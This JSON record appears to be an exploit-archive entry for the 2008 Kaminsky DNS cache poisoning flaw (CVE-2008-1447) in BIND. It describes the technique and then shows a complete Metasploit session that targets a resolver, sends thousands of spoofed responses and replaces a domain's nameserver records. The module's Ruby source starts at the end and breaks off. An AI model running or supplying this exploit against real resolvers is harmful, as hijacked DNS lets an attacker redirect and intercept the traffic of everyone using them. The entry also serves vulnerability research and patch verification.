{
    "text": "ecve : CVE-2008-4194 CVE-2008-1447 ， title : BIND 9.4.1 < 9.4.2 - Remote DNS Cache Poisoning ( Metasploit ) - Multiple remote Exploit ， verified : Verified ， exploit_detail : ____ ____ __ __ ， / \\ / \\ |  |  |  |  ， ----====/ /\\__\\/ /\\ \\ |  |  |  | ====---- ，  |  |  |  | __ |  |  |  |  |  |  ，  |  | ___ | __ |  |  |  |  |  ， ------======\\ \\/ / #  |  |  |  |  #  |  |  |  | ======------ ， \\____/ | __ |  | __ | \\______/ ， Computer Academic Underground ， Exploit Code ， ===============/======================================================== ， Exploit ID : CAU-EX-2008-0003 ， Release Date : 2008.07.23 ， Title : bailiwicked_domain.rb ， Description : Kaminsky DNS Cache Poisoning Flaw Exploit for Domains ， Tested : BIND 9.4.1-9.4.2 ， Attributes : Remote , Poison , Resolver , Metasploit ， Exploit URL :  ， Author/Email : I ) ruid <druid (  @  ) caughq.org> ， H D Moore <hdm (  @  ) metasploit.com> ， ===============/======================================================== ， Description ， This exploit targets a fairly ubiquitous flaw in DNS implementations ， which allow the insertion of malicious DNS records into the cache of the ， target nameserver. This exploit caches a single malicious nameserver ， entry into the target nameserver which replaces the legitimate ， nameservers for the target domain. By causing the target nameserver to ， query for random hostnames at the target domain , the attacker can spoof ， a response to the target server including an answer for the query , an ， authority server record , and an additional record for that server ,  ， causing target nameserver to insert the additional record into the ， cache. This insertion completely replaces the original nameserver ， records for the target domain. ， Example ，  # /msf3/msfconsole ， = [ msf v3.2-release ， + -- --= [ 298 exploits - 124 payloads ， + -- --= [ 18 encoders - 6 nops ， = [ 73 aux ， msf > use auxiliary/spoof/dns/bailiwicked_domain ， msf auxiliary ( bailiwicked_domain ) > set RHOST A.B.C.D ， RHOST => A.B.C.D ， msf auxiliary ( bailiwicked_domain ) > set DOMAIN example.com ， DOMAIN => example.com ， msf auxiliary ( bailiwicked_domain ) > set NEWDNS dns01.metasploit.com ， NEWDNS => dns01.metasploit.com ， msf auxiliary ( bailiwicked_domain ) > set SRCPORT 0 ， SRCPORT => 0 ， msf auxiliary ( bailiwicked_domain ) > check ，  [  *  ] Using the Metasploit service to verify exploitability... ，  [  *  ] ADDRESS : A.B.C.D PORT : 50391 ，  [  *  ] ADDRESS : A.B.C.D PORT : 50391 ，  [  *  ] ADDRESS : A.B.C.D PORT : 50391 ，  [  *  ] ADDRESS : A.B.C.D PORT : 50391 ，  [  *  ] ADDRESS : A.B.C.D PORT : 50391 ，  [  *  ] FAIL : This server uses static source ports and is vulnerable to poisoning ， msf auxiliary ( bailiwicked_domain ) > dig +short -t ns example.com @ A.B.C.D ，  [  *  ] exec : dig +short -t ns example.com @ A.B.C.D ， b.iana-servers.net. ， a.iana-servers.net. ， msf auxiliary ( bailiwicked_domain ) > run ，  [  *  ] Switching to target port 50391 based on Metasploit service ，  [  *  ] Targeting nameserver A.B.C.D for injection of example.com. nameservers as dns01.metasploit.com ，  [  *  ] Querying recon nameserver for example.com.'s nameservers... ，  [  *  ] Got an NS record : example.com. 171957 IN NS b.iana-servers.net. ，  [  *  ] Querying recon nameserver for address of b.iana-servers.net.... ，  [  *  ] Got an A record : b.iana-servers.net. 171028 IN A 193.0.0.236 ，  [  *  ] Checking Authoritativeness : Querying 193.0.0.236 for example.com.... ，  [  *  ] b.iana-servers.net. is authoritative for example.com. , adding to list of nameservers to spoof as ，  [  *  ] Got an NS record : example.com. 171957 IN NS a.iana-servers.net. ，  [  *  ] Querying recon nameserver for address of a.iana-servers.net.... ，  [  *  ] Got an A record : a.iana-servers.net. 171414 IN A 192.0.34.43 ，  [  *  ] Checking Authoritativeness : Querying 192.0.34.43 for example.com.... ，  [  *  ] a.iana-servers.net. is authoritative for example.com. , adding to list of nameservers to spoof as ，  [  *  ] Attempting to inject poison records for example.com.'s nameservers into A.B.C.D : 50391... ，  [  *  ] Sent 1000 queries and 20000 spoofed responses... ，  [  *  ] Sent 2000 queries and 40000 spoofed responses... ，  [  *  ] Sent 3000 queries and 60000 spoofed responses... ，  [  *  ] Sent 4000 queries and 80000 spoofed responses... ，  [  *  ] Sent 5000 queries and 100000 spoofed responses... ，  [  *  ] Sent 6000 queries and 120000 spoofed responses... ，  [  *  ] Sent 7000 queries and 140000 spoofed responses... ，  [  *  ] Sent 8000 queries and 160000 spoofed responses... ，  [  *  ] Sent 9000 queries and 180000 spoofed responses... ，  [  *  ] Sent 10000 queries and 200000 spoofed responses... ，  [  *  ] Sent 11000 queries and 220000 spoofed responses... ，  [  *  ] Sent 12000 queries and 240000 spoofed responses... ，  [  *  ] Sent 13000 queries and 260000 spoofed responses... ，  [  *  ] Poisoning successful after 13250 attempts : example.com. == dns01.metasploit.com ，  [  *  ] Auxiliary module execution completed ， msf auxiliary ( bailiwicked_domain ) > dig +short -t ns example.com @ A.B.C.D ，  [  *  ] exec : dig +short -t ns example.com @ A.B.C.D ， dns01.metasploit.com. ， Credits ， Dan Kaminsky is credited with originally discovering this vulnerability. ， Cedric Blancher <sid (  @  ) rstack.org> figured out the NS injection method and ， was cool enough to email us and share !  ， Metasploit ， require 'msf/core' ， require 'net/dns' ， require 'scruby' ， require 'resolv' ， module Msf",
    "time": "2008-07-23"
}